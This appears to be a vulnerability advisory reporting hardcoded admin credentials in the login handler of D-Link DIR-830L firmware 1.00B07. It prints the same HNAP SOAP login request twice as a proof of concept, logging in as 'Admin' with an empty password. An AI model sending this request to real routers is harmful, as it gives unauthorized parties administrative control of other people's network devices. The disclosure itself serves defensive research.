# Summary
There is a hardcoded credentials vulnerability in ncc2 binary file of D-Link DIR830LA1_FW100B07.

This will cause **unauthorized** users to log in to the router management interface **as admin**.

Fimware download link : https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `do_login` function in sbin/ncc2 binary file and `/info/Login.html`.

# Details
Use IDA to decompile `do_login` in `sbin/ncc2`:
![image](https://github.com/user-attachments/assets/a269551e-0768-4436-8abe-6934439947ac)

It is obviously that credentials of admin are hardcoded.

**PoC**:
```HTTP
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/Login"

HNAP_AUTH: 13A77F4CAC483FF637E6A359535E0F72 1730100920

Content-Length: 428

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/info/Login.html

Cookie: uid=z9mQNrMzBZ



<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Body>
		<Login xmlns="http://purenetworks.com/HNAP1/">
			<Action>request</Action>
			<Username>Admin</Username>
			<LoginPassword></LoginPassword>
			<Captcha></Captcha>
		</Login>
	</soap:Body>
</soap:Envelope>
```

# PoC
**PoC**:
```HTTP
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/Login"

HNAP_AUTH: 13A77F4CAC483FF637E6A359535E0F72 1730100920

Content-Length: 428

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/info/Login.html

Cookie: uid=z9mQNrMzBZ



<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	<soap:Body>
		<Login xmlns="http://purenetworks.com/HNAP1/">
			<Action>request</Action>
			<Username>Admin</Username>
			<LoginPassword></LoginPassword>
			<Captcha></Captcha>
		</Login>
	</soap:Body>
</soap:Envelope>
```
